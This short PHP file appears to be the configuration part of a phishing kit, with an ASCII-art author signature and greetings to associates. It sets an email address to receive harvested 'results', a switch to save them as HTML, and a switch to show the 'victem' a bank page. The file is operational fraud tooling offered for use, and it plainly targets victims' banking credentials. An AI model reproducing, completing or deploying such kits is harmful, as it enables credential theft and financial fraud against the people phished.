﻿<?php 
/*
 █     █░ ▒█████   ██▀███   ██ ▄█▀    ██░ ██  ▄▄▄       ██▀███  ▓█████▄     ██▒   █▓
▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒    ▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌   ▓██░   █▒
▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░    ▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌    ▓██  █▒░
░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄    ░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌     ▒██ █░░
░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄   ░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓       ▒▀█░  
░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒    ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒       ░ ▐░  
  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░    ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒       ░ ░░  
  ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░     ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░         ░░  
    ░        ░ ░     ░     ░  ░       ░  ░  ░      ░  ░   ░        ░             ░  
#By Zetas Oujdi, Work Hard Dream B!G,
#Thanks To Brothers V!rus YassCom, & X-Wjdy;													 
*/
$em   = "akremtn1@gmail.com"; // make your email here !! 
$rzhtm = "on"; // if do you want rezultaa text in html file, make "on" do you not want, make "off" 
$pgbnk = "yes"; // if you want to victem showed bank page, make "yes" or not, make "no"
?>                                                                               